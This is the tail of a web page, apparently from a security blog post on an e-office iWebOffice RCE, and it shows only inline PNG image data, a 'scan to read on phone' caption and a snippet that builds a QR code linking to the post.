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)

手机扫码阅读


var qrcode = new QRCode(document.getElementById("posts-qrcode"), {
text: encodeURI("https://mrxn.net/jswz/eoffice-iWebOffice-OfficeServer2-rce.html"),
width: 100,
height: 100,
colorDark: "#000000",
colorLight: "#ffffff",
correctLevel: QRCode.CorrectLevel.H
});
 